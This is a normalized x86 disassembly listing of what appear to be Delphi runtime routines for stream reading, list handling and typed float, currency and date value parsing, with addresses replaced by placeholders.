mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407fbc
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e430
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c671
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41c9f4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41c9f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c678
mov eax [ ebp - 0x8 ]
call sub_4031ec
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41e540
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41c4cc
sub_41c6a0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41c6c0
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404218
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_403470
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41c4cc
sub_41c728
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_419188
mov esi eax
xor edx edx
push ebp
push sub_41c798
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c79f
mov eax [ rw-data ]
call sub_4191ec
retn
mov edx ebx
mov eax esi
call sub_418dc4
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_4031ec
mov edx ebx
mov eax esi
call sub_418cb4
sub_41c7a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c8b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c8ba
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
xor edx edx
push ebp
push sub_41c896
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c8e8
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41bfb8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418dc4
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_404014
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41c094
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418dc4
call sub_41c728
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418dc4
mov edx eax
mov eax [ rw-data ]
call sub_419100
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_418f10
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41c8c4
push ebx
mov ebx eax
mov eax ebx
call sub_41c9b8
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41b3bc
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41c8e8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4031ec
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_418dc4
call sub_4031ec
inc edi
dec esi
jne r-xdata
sub_41c924
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_403134
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_418250
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_403178
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_4182c8
mov edi eax
mov edx [ esp + 0x4 ]
call sub_4181c8
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403150
test al al
jne r-xdata
sub_41c9f4
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41ca40
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41ca40
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
sub_41ca90
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41cadb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41e290
mov eax [ ebp - 0x4 ]
call sub_40423c
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cae2
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
call sub_41c4cc
sub_41cae8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41cb88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c68c
test al al
jne r-xdata
mov eax ebx
call sub_41c68c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419a78
jmp r-xdata
mov eax ebx
call sub_41c9d0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41d5f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb8f
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_4199ac
mov esi eax
mov eax ebx
call sub_41d5f0
jmp r-xdata
mov eax ebx
call sub_41d540
mov eax ebx
call sub_41c68c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41d75c
mov eax ebx
call sub_41d5f8
sub_41cbb8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ff8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_418c68
inc esi
dec ebx
jne r-xdata
sub_41cbf4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_421910
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ff8
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051b4
add esp 0x4
mov edx ebx
mov eax edi
call sub_4218e4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ff8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_4218e4
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41cc6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ff8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41ccd4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41ccf4
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_4027fc
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41ccd4
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41e724
call sub_4027fc
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_4031ec
sub_41cd54
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41ce3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41e8c4
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41ce0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41ce3f
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41ccf4
pop ecx
test al al
jne r-xdata
call sub_403a34
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039e0
sub_41ce64
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41cedc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_4033e8
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_418784
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41cee1
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41ccf4
pop ecx
test al al
jne r-xdata
call sub_403a34
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039e0
sub_41cf04
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41cf7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41e8c4
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_4033e8
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41cf84
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41ccf4
pop ecx
test al al
jne r-xdata
call sub_403a34
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039e0
sub_41cfa8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41d1c9
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41e254
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41e254
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41d199
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41d157
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41cbf4
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41cc6c
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41cd54
pop ecx
push ebp
call sub_41cf04
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41ce64
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403a64
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41cc6c
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41cc6c
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1d0
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403fa0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4051c0
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_4033e8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418e20
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41cbb8
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418c68
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41cbb8
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418c68
sub_41d15c
push ebp
call sub_41ccd4
pop ecx
test al al
je r-xdata
call sub_4039e0
call sub_403a34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_4031ec
sub_41d1e4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d254
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41d23f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d254
mov eax [ ebp - 0x4 ]
call sub_41c7a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c8e8
retn
sub_41d254
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c68c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d75c
mov eax [ ebp - 0x4 ]
call sub_41d5f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_4033e8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41d316
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_4033e8
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c68c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41cfa8
mov eax [ ebp - 0x4 ]
call sub_41d5f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d31d
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41d324
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41e430
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d5ac
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41c9f4
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41d368
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41e430
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d5ac
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c9f4
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41d3ac
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41e430
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d5ac
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c9f4
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41d3fc
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41e430
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d5ac
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c9f4
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41d440
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41e430
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41c4cc
mov al [ eax + lookup_table_41d467 ]
jmp [ eax * 4 + jump_table_41d475 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c9f4
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40406c
mov eax esi
call j_sub_404448
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c9f4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fd0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fd0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fd0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fd0
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41d540
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41e430
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c9f4
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41c9f4
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c9f4
jmp r-xdata
jmp r-xdata
call sub_41c4cc
sub_41d5ac
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41c9d0
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41d540
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41e430
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c9f4
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41d600
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41c9d0
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41e430
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41d540
mov [ edi ] eax
sub_41d640
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
